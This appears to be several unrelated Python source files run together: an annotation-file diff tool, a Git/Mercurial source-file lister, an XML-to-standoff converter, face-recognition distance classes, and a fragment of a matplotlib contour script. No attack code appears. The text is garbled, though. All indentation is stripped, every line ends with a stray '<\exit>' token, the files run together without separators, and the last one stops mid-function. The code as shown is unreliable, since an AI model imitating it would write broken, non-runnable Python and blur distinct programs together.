return self.first_by_second[second] if second in self.first_by_second else None<\exit>
def is_only_in_second(self, second):<\exit>
return second in self.only_in_second<\exit>
def is_only_in_first(self, first):<\exit>
return first in self.second_by_first<\exit>
class AnnotationDiff:<\exit>
def __init__(self, first, second, result):<\exit>
self.first = first<\exit>
self.second = second<\exit>
self.result = result<\exit>
self.mapping = Mapping()<\exit>
self.first_textbounds = dict((textbound.id, textbound) for textbound in first.get_textbounds())<\exit>
def diff(self):<\exit>
self.diff_entities()<\exit>
self.diff_triggers()<\exit>
self.diff_events()<\exit>
self.diff_oneline_comments()<\exit>
self.diff_equivs()<\exit>
self.diff_normalizations()<\exit>
self.diff_attributes()<\exit>
self.diff_relations()<\exit>
def add_mark(self, type, target, reason):<\exit>
comment = annotation.OnelineCommentAnnotation(<\exit>
target,<\exit>
self.result.get_new_id('#'),<\exit>
type,<\exit>
"\t" + reason)<\exit>
self.result.add_annotation(comment)<\exit>
def add_missing(self, target, reason):<\exit>
self.add_mark('MissingAnnotation', target, reason)<\exit>
def add_added(self, target, reason):<\exit>
self.add_mark('AddedAnnotation', target, reason)<\exit>
def add_changed(self, target, reason):<\exit>
self.add_mark('ChangedAnnotation', target, reason)<\exit>
def find_entity(self, haystack, needle):<\exit>
for entity in haystack.get_entities():<\exit>
if entity.same_span(needle) and entity.type == needle.type:<\exit>
return entity<\exit>
return None<\exit>
def diff_entities(self):<\exit>
found_first_ids = set()<\exit>
for entity in self.second.get_entities():<\exit>
found_first = self.find_entity(self.first, entity)<\exit>
if found_first is None:<\exit>
self.add_added(entity.id, 'Added entity')<\exit>
else:<\exit>
found_first_ids.add(found_first.id)<\exit>
self.mapping.add(found_first.id, entity.id)<\exit>
import copy<\exit>
for entity in self.first.get_entities():<\exit>
if not entity.id in found_first_ids:<\exit>
clone = copy.copy(entity)<\exit>
clone.id = self.result.get_new_id('T')<\exit>
self.result.add_annotation(clone)<\exit>
self.mapping.add(entity.id, clone.id, True)<\exit>
self.add_missing(clone.id, 'Missing entity')<\exit>
def find_trigger(self, haystack, needle):<\exit>
for trigger in haystack.get_triggers():<\exit>
if trigger.same_span(needle) and trigger.type == needle.type:<\exit>
return trigger<\exit>
return None<\exit>
def diff_triggers(self):<\exit>
found_first_ids = set()<\exit>
for trigger in self.second.get_triggers():<\exit>
found_first = self.find_trigger(self.first, trigger)<\exit>
if found_first:<\exit>
found_first_ids.add(found_first.id)<\exit>
self.mapping.add(found_first.id, trigger.id)<\exit>
import copy<\exit>
for trigger in self.first.get_triggers():<\exit>
if not trigger.id in found_first_ids:<\exit>
clone = copy.copy(trigger)<\exit>
clone.id = self.result.get_new_id('T')<\exit>
self.result.add_annotation(clone)<\exit>
self.mapping.add(trigger.id, clone.id, True)<\exit>
def trigger_or_self(self, target, triggers):<\exit>
try:<\exit>
return triggers[target]<\exit>
except KeyError:<\exit>
return target<\exit>
def find_closest_events(self, second_event, found_events_dict, first_triggers, second_triggers):<\exit>
second_args = dict((role, self.trigger_or_self(target, second_triggers)) for (role, target) in second_event.args)<\exit>
second_roles = set(second_args.keys())<\exit>
for first_event in self.first.get_events():<\exit>
if self.mapping.get_second(first_event.trigger) == second_event.trigger and first_event.type == second_event.type:<\exit>
first_args = dict((role, self.mapping.get_second(self.trigger_or_self(target, first_triggers))) for (role, target) in first_event.args)<\exit>
first_roles = set(first_args.keys())<\exit>
only_first = set(role for role in first_roles if first_args.get(role) != second_args.get(role))<\exit>
only_second = set(role for role in second_roles if first_args.get(role) != second_args.get(role))<\exit>
match = (first_event.id, first_args, second_args, only_first, only_second)<\exit>
score = len(only_first) + len(only_second)<\exit>
try:<\exit>
found_events_dict[score]<\exit>
except KeyError:<\exit>
found_events_dict[score] = dict()<\exit>
try:<\exit>
found_events_dict[score][second_event.id]<\exit>
except KeyError:<\exit>
found_events_dict[score][second_event.id] = []<\exit>
found_events_dict[score][second_event.id].append(match)<\exit>
def diff_events(self):<\exit>
second_triggers = dict((event.id, event.trigger) for event in self.second.get_events())<\exit>
first_triggers = dict((event.id, event.trigger) for event in self.first.get_events())<\exit>
found_first_ids = set()<\exit>
found_second_ids = set()<\exit>
found_events_dict = dict()<\exit>
for event in self.second.get_events():<\exit>
self.find_closest_events(event, found_events_dict, first_triggers, second_triggers)<\exit>
for score in sorted(found_events_dict.keys()):<\exit>
for second_event_id in found_events_dict[score]:<\exit>
if not second_event_id in found_second_ids:<\exit>
for match in found_events_dict[score][second_event_id]:<\exit>
first_event_id, first_args, second_args, only_first, only_second = match<\exit>
if not first_event_id in found_first_ids:<\exit>
found_first_ids.add(first_event_id)<\exit>
found_second_ids.add(second_event_id)<\exit>
self.mapping.add(first_event_id, second_event_id)<\exit>
for role in only_first:<\exit>
first_text = self.first_textbounds[self.mapping.get_first(first_args[role])].get_text()<\exit>
if role in only_second:<\exit>
self.add_changed(second_event_id, 'Changed role %s (from %s "%s")' % (role, first_args[role], first_text))<\exit>
else:<\exit>
self.add_changed(second_event_id, 'Missing role %s (%s "%s")' % (role, first_args[role], first_text))<\exit>
for role in only_second - only_first:<\exit>
self.add_changed(second_event_id, 'Added role %s' % role)<\exit>
for event in self.second.get_events():<\exit>
if not event.id in found_second_ids:<\exit>
self.add_added(event.id, 'Added event')<\exit>
for event in self.first.get_events():<\exit>
if not event.id in found_first_ids:<\exit>
import copy<\exit>
clone = copy.copy(event)<\exit>
clone.id = self.result.get_new_id('E')<\exit>
clone.trigger = self.mapping.get_second(event.trigger)<\exit>
clone.args = [(role, self.mapping.get_second(trigger)) for (role, trigger) in clone.args]<\exit>
self.result.add_annotation(clone)<\exit>
self.mapping.add(event.id, clone.id, True)<\exit>
self.add_missing(clone.id, 'Missing event')<\exit>
def find_attribute(self, haystack, needle, target):<\exit>
for attribute in haystack.get_attributes():<\exit>
if attribute.target == target and attribute.type == needle.type:<\exit>
return attribute<\exit>
return None<\exit>
def has_attribute(self, haystack, needle, target):<\exit>
return (self.find_attribute(haystack, needle, target) is not None)<\exit>
def diff_attributes(self):<\exit>
for attribute in self.second.get_attributes():<\exit>
target_in_first = self.mapping.get_first(attribute.target)<\exit>
found_first = self.find_attribute(self.first, attribute, target_in_first)<\exit>
if found_first is None:<\exit>
if target_in_first:<\exit>
self.add_changed(attribute.target, 'Added attribute %s' % attribute.type)<\exit>
elif found_first.value != attribute.value:<\exit>
self.add_changed(attribute.target, 'Changed attribute %s (from %s)' % (attribute.type, found_first.value))<\exit>
for attribute in self.first.get_attributes():<\exit>
target_in_second = self.mapping.get_second(attribute.target)<\exit>
if self.mapping.is_only_in_first(attribute.target):<\exit>
import copy<\exit>
clone = copy.copy(attribute)<\exit>
clone.id = self.result.get_new_id('A')<\exit>
clone.target = target_in_second<\exit>
self.result.add_annotation(clone)<\exit>
else:<\exit>
if not self.has_attribute(self.second, attribute, target_in_second) and target_in_second:<\exit>
self.add_changed(attribute.target, 'Missing attribute %s (%s)' % (attribute.type, attribute.value))<\exit>
def has_oneline_comment(self, haystack, needle, target):<\exit>
for oneline_comment in haystack.get_oneline_comments():<\exit>
if oneline_comment.target == target and oneline_comment.get_text() == needle.get_text():<\exit>
return True<\exit>
return False<\exit>
def diff_oneline_comments(self):<\exit>
for oneline_comment in self.second.get_oneline_comments():<\exit>
target_in_first = self.mapping.get_first(oneline_comment.target)<\exit>
if not self.has_oneline_comment(self.first, oneline_comment, target_in_first):<\exit>
self.add_changed(oneline_comment.target, 'Added %s: "%s"' % (oneline_comment.type, oneline_comment.get_text()))<\exit>
for oneline_comment in self.first.get_oneline_comments():<\exit>
target_in_second = self.mapping.get_second(oneline_comment.target)<\exit>
if not self.has_oneline_comment(self.second, oneline_comment, target_in_second):<\exit>
self.add_changed(target_in_second, 'Missing %s: "%s"' % (oneline_comment.type, oneline_comment.get_text()))<\exit>
def diff_equivs(self):<\exit>
correspondence_map = dict()<\exit>
second_equivs = [equiv.entities for equiv in self.second.get_equivs()]<\exit>
for equiv_group, equiv in enumerate(second_equivs):<\exit>
for entity in equiv:<\exit>
correspondence_map[entity] = [None, equiv_group]<\exit>
first_equivs = [equiv.entities for equiv in self.first.get_equivs()]<\exit>
for equiv_group, equiv in enumerate(first_equivs):<\exit>
for first_entity in equiv:<\exit>
entity = self.mapping.get_second(first_entity)<\exit>
if entity in correspondence_map:<\exit>
correspondence_map[entity][0] = equiv_group<\exit>
else:<\exit>
correspondence_map[entity] = [equiv_group, None]<\exit>
correspondence_hist = dict()<\exit>
for entity in correspondence_map.keys():<\exit>
key = "%s-%s" % tuple(correspondence_map[entity])<\exit>
if key not in correspondence_hist:<\exit>
correspondence_hist[key] = [1, correspondence_map[entity], [entity]]<\exit>
else:<\exit>
correspondence_hist[key][0] += 1<\exit>
correspondence_hist[key][2].append(entity)<\exit>
seen = []<\exit>
import operator<\exit>
sorted_hist = sorted(correspondence_hist.iteritems(), key=operator.itemgetter(1))<\exit>
for key, equiv_item in sorted_hist:<\exit>
count, correspondence_pair, entities = equiv_item<\exit>
first_group, second_group = correspondence_pair<\exit>
for entity in entities:<\exit>
if first_group is None:<\exit>
self.add_changed(entity, 'Added to equiv')<\exit>
elif second_group is None:<\exit>
rest = ["%s (%s)" % (self.mapping.get_second(other), self.first_textbounds[other].get_text()) for other in first_equivs[first_group] if other != entity]<\exit>
self.add_changed(entity, 'Missing from equiv with %s' % ', '.join(rest))<\exit>
elif entity in seen:<\exit>
rest = ["%s (%s)" % (self.mapping.get_second(other), self.first_textbounds[other].get_text()) for other in first_equivs[first_group] if other != entity]<\exit>
self.add_changed(entity, 'Changed from equiv %s' % ', '.join(rest))<\exit>
else:<\exit>
seen.append(entity)<\exit>
def diff_relations(self):<\exit>
first_relations = dict(((self.mapping.get_second(relation.arg1), self.mapping.get_second(relation.arg2), relation.type), relation.id) for relation in self.first.get_relations())<\exit>
second_relations = dict(((relation.arg1, relation.arg2, relation.type), relation.id) for relation in self.second.get_relations())<\exit>
first_relations_set = set(first_relations)<\exit>
second_relations_set = set(second_relations)<\exit>
for relation in second_relations_set - first_relations_set:<\exit>
source, target, relation_type = relation<\exit>
self.add_changed(source, 'Added relation %s to %s' % (relation_type, target))<\exit>
for relation in first_relations_set - second_relations_set:<\exit>
source, target, relation_type = relation<\exit>
first_text = self.first_textbounds[self.mapping.get_first(target)].get_text()<\exit>
self.add_changed(source, 'Missing relation %s to %s "%s"' % (relation_type, target, first_text))<\exit>
def has_normalization(self, haystack, needle, target):<\exit>
for normalization in haystack.get_normalizations():<\exit>
if normalization.target == target and normalization.refdb == needle.refdb and normalization.refid == needle.refid:<\exit>
return True<\exit>
return False<\exit>
def diff_normalizations(self):<\exit>
for normalization in self.second.get_normalizations():<\exit>
target_in_first = self.mapping.get_first(normalization.target)<\exit>
if not self.has_normalization(self.first, normalization, target_in_first):<\exit>
self.add_changed(normalization.target, 'Added normalization %s:%s "%s"' % (normalization.refdb, normalization.refid, normalization.reftext))<\exit>
for normalization in self.first.get_normalizations():<\exit>
target_in_second = self.mapping.get_second(normalization.target)<\exit>
if not self.has_normalization(self.second, normalization, target_in_second):<\exit>
self.add_changed(target_in_second, 'Missing normalization %s:%s "%s"' % (normalization.refdb, normalization.refid, normalization.reftext))<\exit>
KNOWN_FILE_SUFF = [annotation.TEXT_FILE_SUFFIX] + annotation.KNOWN_FILE_SUFF<\exit>
EXTENSIONS_RE = '\\.(%s)$' % '|'.join(KNOWN_FILE_SUFF)<\exit>
def name_without_extension(file_name):<\exit>
import re<\exit>
return re.sub(EXTENSIONS_RE, '', file_name)<\exit>
def copy_annotations(original_name, new_name):<\exit>
import shutil<\exit>
for extension in KNOWN_FILE_SUFF:<\exit>
try:<\exit>
shutil.copyfile('%s.%s' % (original_name, extension), '%s.%s' % (new_name, extension))<\exit>
except IOError, e:<\exit>
pass<\exit>
return annotation.TextAnnotations(new_name)<\exit>
def delete_annotations(name):<\exit>
bare_name = name_without_extension(name)<\exit>
for extension in KNOWN_FILE_SUFF:<\exit>
try:<\exit>
os.remove('%s.%s' % (name, extension))<\exit>
except OSError, e:<\exit>
pass<\exit>
def diff_files(first_name, second_name, result_name):<\exit>
first_bare = name_without_extension(first_name)<\exit>
second_bare = name_without_extension(second_name)<\exit>
result_bare = name_without_extension(result_name)<\exit>
first = annotation.TextAnnotations(first_bare)<\exit>
second = annotation.TextAnnotations(second_bare)<\exit>
result = copy_annotations(second_bare, result_bare)<\exit>
with result:<\exit>
AnnotationDiff(first, second, result).diff()<\exit>
def is_dir(name):<\exit>
import os.path<\exit>
if os.path.exists(name):<\exit>
return os.path.isdir(name)<\exit>
else:<\exit>
bare_name = name_without_extension(name)<\exit>
for ext in annotation.KNOWN_FILE_SUFF:<\exit>
if os.path.isfile('%s.%s' % (bare_name, ext)):<\exit>
return False<\exit>
return None<\exit>
def add_files(files, dir_or_file, errors):<\exit>
import glob<\exit>
import re<\exit>
is_a_dir = is_dir(dir_or_file)<\exit>
if is_a_dir is None:<\exit>
errors.append('Error: no annotation files found in %s' % dir_or_file)<\exit>
elif not is_a_dir:<\exit>
files.append(dir_or_file)<\exit>
else:<\exit>
subfiles = glob.glob(os.path.join(dir_or_file, '*'))<\exit>
matching_subfiles = [subfile for subfile in subfiles if re.search(EXTENSIONS_RE, subfile)]<\exit>
bare_subfiles = set([name_without_extension(subfile) for subfile in matching_subfiles])<\exit>
found = False<\exit>
for subfile in bare_subfiles:<\exit>
if is_dir(subfile) == False:<\exit>
files.append(subfile)<\exit>
found = True<\exit>
if not found:<\exit>
errors.append('Error: no annotation files found in %s' % dir_or_file)<\exit>
def diff_files_and_dirs(firsts, second, result, force=False, verbose=False):<\exit>
import os.path<\exit>
errors = []<\exit>
fatal_errors = []<\exit>
second_dir = is_dir(second)<\exit>
result_dir = is_dir(result)<\exit>
single_first = len(firsts) == 1 and is_dir(firsts[0]) == False<\exit>
first_files = []<\exit>
for first in firsts:<\exit>
add_files(first_files, first, errors)<\exit>
if first_files == []:<\exit>
fatal_errors.append('Error: no annotation files found in %s' % ', '.join(firsts))<\exit>
if second_dir is None:<\exit>
fatal_errors.append('Error: no annotation files found in %s' % second)<\exit>
if not single_first and len(first_files) > 1 and result_dir is False:<\exit>
fatal_errors.append('Error: result of comparison of multiple files doesn\'t fit in %s' % result)<\exit>
errors.extend(fatal_errors)<\exit>
if fatal_errors == []:<\exit>
if not single_first and second_dir and result_dir is None:<\exit>
os.mkdir(result)<\exit>
result_dir = True<\exit>
for first_name in first_files:<\exit>
basename = os.path.basename(first_name)<\exit>
if verbose:<\exit>
print "Comparing", basename<\exit>
if second_dir:<\exit>
second_name = os.path.join(second, basename)<\exit>
if is_dir(second_name) != False:<\exit>
errors.append('Error: No annotation files found corresponding to %s' % second_name)<\exit>
continue<\exit>
else:<\exit>
second_name = second<\exit>
result_name = os.path.join(result, basename) if result_dir else result<\exit>
real_result_dir = is_dir(result_name)<\exit>
if real_result_dir == True:<\exit>
errors.append('Error: %s is a directory' % result_name)<\exit>
continue<\exit>
if real_result_dir == False:<\exit>
if force:<\exit>
delete_annotations(result_name)<\exit>
else:<\exit>
errors.append('Error: %s already exists (use --force to overwrite)' % result_name)<\exit>
continue<\exit>
diff_files(first_name, second_name, result_name)<\exit>
if errors != []:<\exit>
sys.stderr.write("\n".join(errors) + "\n")<\exit>
exit(1)<\exit>
def argparser():<\exit>
import argparse<\exit>
ap=argparse.ArgumentParser(description="Diff two annotation files, creating a diff annotation file")<\exit>
ap.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose output.")<\exit>
ap.add_argument("firsts", metavar="<first>", nargs="+", help="Original (or gold standard) directories/files")<\exit>
ap.add_argument("second", metavar="<second>", help="Changed (or tested) directory/file")<\exit>
ap.add_argument("result", metavar="<result>", help="Output file/directory")<\exit>
ap.add_argument("-f", "--force", action="store_true", help="Force overwrite")<\exit>
return ap<\exit>
def main(argv=None):<\exit>
if argv is None:<\exit>
argv = sys.argv<\exit>
args = argparser().parse_args(argv[1:])<\exit>
diff_files_and_dirs(args.firsts, args.second, args.result, args.force, args.verbose)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
sys.exit(main(sys.argv))<\exit>
import os<\exit>
import subprocess<\exit>
import sys<\exit>
class CVSHandler():<\exit>
def __init__(self, cvs):<\exit>
self._roots_cache = {}<\exit>
self._not_tracked_cache = set()<\exit>
self.cvs = cvs<\exit>
def _get_root_from_cache(self, directory):<\exit>
if directory in self._roots_cache:<\exit>
return directory<\exit>
if os.path.dirname(directory) == directory:<\exit>
return None<\exit>
return self._get_root_from_cache(os.path.dirname(directory))<\exit>
def get_source_files(self, directory):<\exit>
if directory in self._not_tracked_cache:<\exit>
return None<\exit>
root_dir = self._get_root_from_cache(directory)<\exit>
if not root_dir:<\exit>
try:<\exit>
root_dir = self.cvs._get_root(directory)<\exit>
self._roots_cache[root_dir] = self.cvs._get_tracked_files(root_dir)<\exit>
except Exception as e:<\exit>
self._not_tracked_cache.add(directory)<\exit>
return None<\exit>
files = self._roots_cache[root_dir]<\exit>
if directory != root_dir:<\exit>
rel_dir = os.path.relpath(directory, root_dir)<\exit>
files = [f[len(rel_dir)+1:] for f in files if f.startswith(rel_dir)]<\exit>
return files<\exit>
class Git():<\exit>
@staticmethod<\exit>
def _get_root(directory):<\exit>
return run_command("cd %s && git rev-parse --show-toplevel" % directory).strip()<\exit>
@staticmethod<\exit>
def _get_tracked_files(directory):<\exit>
return run_command("cd %s && git ls-files && git ls-files --others --exclude-standard" % directory).strip().split('\n')<\exit>
class Mercurial():<\exit>
@staticmethod<\exit>
def _get_root(directory):<\exit>
return run_command("cd %s && hg root" % directory).strip()<\exit>
@staticmethod<\exit>
def _get_tracked_files(directory):<\exit>
return run_command("cd %s && (hg status -marcu | cut -d' ' -f2)" % directory).strip().split('\n')<\exit>
class DefaultDirHandler():<\exit>
def __init__(self):<\exit>
self._cache = {}<\exit>
self.MAX_DEPTH = 3<\exit>
def _walk_down(self, start_dir):<\exit>
try:<\exit>
out = run_command("find %s -maxdepth %s -type f -not -path '*/\.*'" % (start_dir, self.MAX_DEPTH))<\exit>
except subprocess.CalledProcessError as e:<\exit>
out = e.output<\exit>
if sys.version_info >= (3, 0):<\exit>
out = out.decode('utf-8')<\exit>
if not out:<\exit>
return []<\exit>
files = out.split('\n')<\exit>
return [os.path.relpath(f, start_dir) for f in files if f]<\exit>
def get_source_files(self, start_dir):<\exit>
if not start_dir in self._cache:<\exit>
self._cache[start_dir] = self._walk_down(start_dir)<\exit>
return self._cache[start_dir]<\exit>
def run_command(string):<\exit>
DEVNULL = open(os.devnull, 'wb')<\exit>
out = subprocess.check_output(string, stderr=DEVNULL, shell=True)<\exit>
if sys.version_info >= (3, 0):<\exit>
return out.decode('utf-8')<\exit>
return out<\exit>
git = CVSHandler(Git)<\exit>
hg = CVSHandler(Mercurial)<\exit>
default = DefaultDirHandler()<\exit>
def get_source_files(directory):<\exit>
files = git.get_source_files(directory)<\exit>
if files:<\exit>
return files<\exit>
files = hg.get_source_files(directory)<\exit>
if files:<\exit>
return files<\exit>
return default.get_source_files(directory)<\exit>
import sys<\exit>
import re<\exit>
try:<\exit>
import cElementTree as ET<\exit>
except:<\exit>
import xml.etree.cElementTree as ET<\exit>
EXCLUDED_TAGS = [<\exit>
"PAPER",<\exit>
"s",<\exit>
]<\exit>
EXCLUDED_TAG = { t:True for t in EXCLUDED_TAGS }<\exit>
ELIDED_TEXT_STRING = "[[[...]]]"<\exit>
MAXIMUM_TEXT_DISPLAY_LENGTH = 1000<\exit>
def c_escape(s):<\exit>
return s.replace('\\', '\\\\').replace('\t','\\t').replace('\n','\\n')<\exit>
def strip_ns(tag):<\exit>
return tag if tag[0] != '{' else re.sub(r'\{.*?\}', '', tag)<\exit>
class Standoff:<\exit>
def __init__(self, sid, element, start, end, text):<\exit>
self.sid     = sid<\exit>
self.element = element<\exit>
self.start   = start<\exit>
self.end     = end<\exit>
self.text    = text<\exit>
def strip(self):<\exit>
while self.start < self.end and self.text[0].isspace():<\exit>
self.start += 1<\exit>
self.text = self.text[1:]<\exit>
while self.start < self.end and self.text[-1].isspace():<\exit>
self.end -= 1<\exit>
self.text = self.text[:-1]<\exit>
def compress_text(self, l):<\exit>
if len(self.text) >= l:<\exit>
el = len(ELIDED_TEXT_STRING)<\exit>
sl = (l-el)/2<\exit>
self.text = (self.text[:sl]+ELIDED_TEXT_STRING+self.text[-(l-sl-el):])<\exit>
def tag(self):<\exit>
return strip_ns(self.element.tag)<\exit>
def attrib(self):<\exit>
attrib = {}<\exit>
for a in self.element.attrib:<\exit>
if a[0] == "{":<\exit>
an = re.sub(r'\{.*?\}', '', a)<\exit>
else:<\exit>
an = a<\exit>
attrib[an] = self.element.attrib[a]<\exit>
return attrib<\exit>
def __str__(self):<\exit>
return "X%d\t%s %d %d\t%s\t%s" % \<\exit>
(self.sid, self.tag(), self.start, self.end,<\exit>
c_escape(self.text.encode("utf-8")),<\exit>
" ".join(['%s="%s"' % (k.encode("utf-8"), v.encode("utf-8"))<\exit>
for k,v in self.attrib().items()]))<\exit>
def txt(s):<\exit>
return s if s is not None else ""<\exit>
next_free_so_id = 1<\exit>
def text_and_standoffs(e, curroff=0, standoffs=None):<\exit>
global next_free_so_id<\exit>
if standoffs == None:<\exit>
standoffs = []<\exit>
startoff = curroff<\exit>
so = Standoff(next_free_so_id, e, 0, 0, "")<\exit>
next_free_so_id += 1<\exit>
standoffs.append(so)<\exit>
setext, _ = subelem_text_and_standoffs(e, curroff+len(txt(e.text)),<\exit>
standoffs)<\exit>
text = txt(e.text) + setext<\exit>
curroff += len(text)<\exit>
so.start = startoff<\exit>
so.end   = curroff<\exit>
so.text  = text<\exit>
return (text, standoffs)<\exit>
def subelem_text_and_standoffs(e, curroff, standoffs):<\exit>
startoff = curroff<\exit>
text = ""<\exit>
for s in e:<\exit>
stext, dummy = text_and_standoffs(s, curroff, standoffs)<\exit>
text += stext<\exit>
text += txt(s.tail)<\exit>
curroff = startoff + len(text)<\exit>
return (text, standoffs)<\exit>
NORM_SPACE_REGEX = re.compile(r'\s+')<\exit>
def normalize_space(e, tags=None):<\exit>
if strip_ns(e.tag) == 'PAPER':<\exit>
assert e.text == '' or e.text.isspace()<\exit>
e.text = ''<\exit>
if tags is None or strip_ns(e.tag) in tags:<\exit>
if e.text is not None:<\exit>
n = NORM_SPACE_REGEX.sub(' ', e.text)<\exit>
e.text = n<\exit>
if e.tail is not None:<\exit>
n = NORM_SPACE_REGEX.sub(' ', e.tail)<\exit>
e.tail = n<\exit>
for c in e:<\exit>
normalize_space(c)<\exit>
def add_newlines(e):<\exit>
if (strip_ns(e.tag) == 'segment' and<\exit>
e.attrib.get('segtype').strip() == 'Header'):<\exit>
assert e.tail == '' or e.tail.isspace(), 'unexpected content in tail'<\exit>
e.text = '\n' + (e.text if e.text is not None else '')<\exit>
e.tail = '\n'<\exit>
for c in e:<\exit>
add_newlines(c)<\exit>
def generate_id(prefix):<\exit>
if prefix not in generate_id._next:<\exit>
generate_id._next[prefix] = 1<\exit>
id_ = prefix+str(generate_id._next[prefix])<\exit>
generate_id._next[prefix] += 1<\exit>
return id_<\exit>
generate_id._next = {}<\exit>
def convert_segment(s):<\exit>
sostrings = []<\exit>
if s.start == s.end:<\exit>
return []<\exit>
tid = generate_id('T')<\exit>
sostrings.append('%s\t%s %d %d\t%s' % \<\exit>
(tid, s.attrib()['segtype'].strip(), s.start, s.end,<\exit>
s.text.encode('utf-8')))<\exit>
return sostrings<\exit>
convert_function = {<\exit>
"segment" : convert_segment,<\exit>
}<\exit>
def main(argv=[]):<\exit>
if len(argv) != 4:<\exit>
print >> sys.stderr, "Usage:", argv[0], "IN-XML OUT-TEXT OUT-SO"<\exit>
return -1<\exit>
in_fn, out_txt_fn, out_so_fn = argv[1:]<\exit>
if in_fn == "-":<\exit>
in_fn = "/dev/stdin"<\exit>
if out_txt_fn == "-":<\exit>
out_txt_fn = "/dev/stdout"<\exit>
if out_so_fn == "-":<\exit>
out_so_fn = "/dev/stdout"<\exit>
tree = ET.parse(in_fn)<\exit>
root = tree.getroot()<\exit>
normalize_space(root, ['segment'])<\exit>
add_newlines(root)<\exit>
text, standoffs = text_and_standoffs(root)<\exit>
for s in standoffs:<\exit>
s.strip()<\exit>
standoffs = [s for s in standoffs if not s.tag() in EXCLUDED_TAG]<\exit>
converted = []<\exit>
for s in standoffs:<\exit>
if s.tag() in convert_function:<\exit>
converted.extend(convert_function[s.tag()](s))<\exit>
else:<\exit>
converted.append(s)<\exit>
standoffs = converted<\exit>
for so in standoffs:<\exit>
try:<\exit>
so.compress_text(MAXIMUM_TEXT_DISPLAY_LENGTH)<\exit>
except AttributeError:<\exit>
pass<\exit>
out_txt = open(out_txt_fn, "wt")<\exit>
out_so  = open(out_so_fn, "wt")<\exit>
out_txt.write(text.encode("utf-8"))<\exit>
for so in standoffs:<\exit>
print >> out_so, so<\exit>
out_txt.close()<\exit>
out_so.close()<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import numpy as np<\exit>
from facerec_py.facerec import normalization<\exit>
class AbstractDistance(object):<\exit>
def __init__(self, name):<\exit>
self._name = name<\exit>
def __call__(self,p,q):<\exit>
raise NotImplementedError("Every AbstractDistance must implement the __call__ method.")<\exit>
@property<\exit>
def name(self):<\exit>
return self._name<\exit>
def __repr__(self):<\exit>
return self._name<\exit>
class EuclideanDistance(AbstractDistance):<\exit>
def __init__(self):<\exit>
AbstractDistance.__init__(self, "EuclideanDistance")<\exit>
def __call__(self, p, q):<\exit>
p = np.asarray(p).flatten()<\exit>
q = np.asarray(q).flatten()<\exit>
return np.sqrt(np.sum(np.power(p-q, 2)))<\exit>
class CosineDistance(AbstractDistance):<\exit>
def __init__(self):<\exit>
AbstractDistance.__init__(self, "CosineDistance")<\exit>
def __call__(self, p, q):<\exit>
p = np.asarray(p).flatten()<\exit>
q = np.asarray(q).flatten()<\exit>
return -np.dot(p.T,q) / (np.sqrt(np.dot(p,p.T)*np.dot(q,q.T)))<\exit>
class NormalizedCorrelation(AbstractDistance):<\exit>
def __init__(self):<\exit>
AbstractDistance.__init__(self, "NormalizedCorrelation")<\exit>
def __call__(self, p, q):<\exit>
p = np.asarray(p).flatten()<\exit>
q = np.asarray(q).flatten()<\exit>
pmu = p.mean()<\exit>
qmu = q.mean()<\exit>
pm = p - pmu<\exit>
qm = q - qmu<\exit>
return 1.0 - (np.dot(pm, qm) / (np.sqrt(np.dot(pm, pm)) * np.sqrt(np.dot(qm, qm))))<\exit>
class ChiSquareDistance(AbstractDistance):<\exit>
def __init__(self):<\exit>
AbstractDistance.__init__(self, "ChiSquareDistance")<\exit>
def __call__(self, p, q):<\exit>
p = np.asarray(p).flatten()<\exit>
q = np.asarray(q).flatten()<\exit>
bin_dists = (p-q)**2 / (p+q+np.finfo('float').eps)<\exit>
return np.sum(bin_dists)<\exit>
class HistogramIntersection(AbstractDistance):<\exit>
def __init__(self):<\exit>
AbstractDistance.__init__(self, "HistogramIntersection")<\exit>
def __call__(self, p, q):<\exit>
p = np.asarray(p).flatten()<\exit>
q = np.asarray(q).flatten()<\exit>
sim = np.sum(np.minimum(p, q))<\exit>
return 1/(sim+1)<\exit>
class HistogramNormalizationIntersection(AbstractDistance):<\exit>
def __init__(self):<\exit>
super(self.__class__, self).__init__("HistogramNormalizationIntersection")<\exit>
self.hist_int = HistogramIntersection()<\exit>
def __call__(self, p, q):<\exit>
p = np.asarray(p).flatten()<\exit>
q = np.asarray(q).flatten()<\exit>
p = normalization.vector_normalize(p)<\exit>
q = normalization.vector_normalize(q)<\exit>
return self.hist_int(p, q)<\exit>
class BinRatioDistance(AbstractDistance):<\exit>
def __init__(self):<\exit>
AbstractDistance.__init__(self, "BinRatioDistance")<\exit>
def __call__(self, p, q):<\exit>
p = np.asarray(p).flatten()<\exit>
q = np.asarray(q).flatten()<\exit>
a = np.abs(1-np.dot(p,q.T))<\exit>
b = ((p-q)**2 + 2*a*(p*q))/((p+q)**2+np.finfo('float').eps)<\exit>
return np.abs(np.sum(b))<\exit>
class L1BinRatioDistance(AbstractDistance):<\exit>
def __init__(self):<\exit>
AbstractDistance.__init__(self, "L1-BinRatioDistance")<\exit>
def __call__(self, p, q):<\exit>
p = np.asarray(p, dtype=np.float).flatten()<\exit>
q = np.asarray(q, dtype=np.float).flatten()<\exit>
a = np.abs(1-np.dot(p,q.T))<\exit>
b = ((p-q)**2 + 2*a*(p*q)) * abs(p-q) / ((p+q)**2+np.finfo('float').eps)<\exit>
return np.abs(np.sum(b))<\exit>
class ChiSquareBRD(AbstractDistance):<\exit>
def __init__(self):<\exit>
AbstractDistance.__init__(self, "ChiSquare-BinRatioDistance")<\exit>
def __call__(self, p, q):<\exit>
p = np.asarray(p, dtype=np.float).flatten()<\exit>
q = np.asarray(q, dtype=np.float).flatten()<\exit>
a = np.abs(1-np.dot(p,q.T))<\exit>
b = ((p-q)**2 + 2*a*(p*q)) * (p-q)**2 / ((p+q)**3+np.finfo('float').eps)<\exit>
return np.abs(np.sum(b))<\exit>
from matplotlib import cm<\exit>
from matplotlib.delaunay.testfuncs import gauss<\exit>
from matplotlib.mlab import griddata<\exit>
import numpy as np<\exit>
import matplotlib.pyplot as plt<\exit>
import scipy.interpolate<\exit>
from scipy.stats import uniform<\exit>
from matplotlib.mlab import bivariate_normal<\exit>
from mpl_toolkits.mplot3d import Axes3D<\exit>
def draw_contour():<\exit>
x, y, z = 10*np.random.random((3, 10))<\exit>
xi, yi = np.linspace(x.min(), x.max(), 100), np.linspace(y.min(), y.max(), 100)<\exit>
xi, yi = np.meshgrid(xi, yi)<\exit>
rbf = scipy.interpolate.Rbf(x, y, z, function='linear')<\exit>
zi = rbf(xi, yi)<\exit>
